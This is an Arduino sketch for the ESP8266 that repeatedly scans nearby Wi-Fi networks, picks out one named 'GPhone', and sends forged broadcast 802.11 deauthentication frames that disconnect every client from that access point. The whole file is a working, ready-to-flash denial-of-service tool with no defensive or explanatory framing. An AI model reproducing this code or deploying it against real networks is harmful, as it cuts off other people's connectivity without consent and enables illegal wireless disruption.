#include <ESP8266WiFi.h>

#define NUMNET 30

uint8_t numNetworks = 0;
String knownMACS[NUMNET];

void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.println("Deauthing GPhone");

  // Set WiFi to station mode and disconnect from any AP
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
}

void loop() {
  findNewNetworks();
  delay(5000);
}

void deauthAttack(uint8_t* apMac, uint8_t channel) {
  Serial.println("Deauthing...");
  uint8_t packet[26] = {
    0xC0, 0x00, // Frame Control
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
    0x00, 0x00, // Fragment & Sequence number
    0x01, 0x00  // Reason code 1 (no reason given)
  };

  wifi_set_channel(channel);//same chanel as

  memcpy(&packet[10], apMac, 6);
  memcpy(&packet[16], apMac, 6);

  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
  wifi_send_pkt_freedom(packet, 26, 0);
}
void findNewNetworks(){
  uint8_t newNumNetworks = WiFi.scanNetworks();

  for (uint8_t i = 0; i < newNumNetworks; i++){
    String newMAC = WiFi.BSSIDstr(i);
    bool newNetwork = true;

    for (uint8_t k = 0; k < numNetworks; k++){
      if(newMAC == knownMACS[k]){
        newNetwork = false;
        break;
      }
    }

    if(newNetwork){
      String ssid = WiFi.SSID(i);
      if(ssid == "GPhone"){
        Serial.println("Network found");
        Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i));
        Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));

        deauthAttack(WiFi.BSSID(i), WiFi.channel(i));
      }
    }
  }
}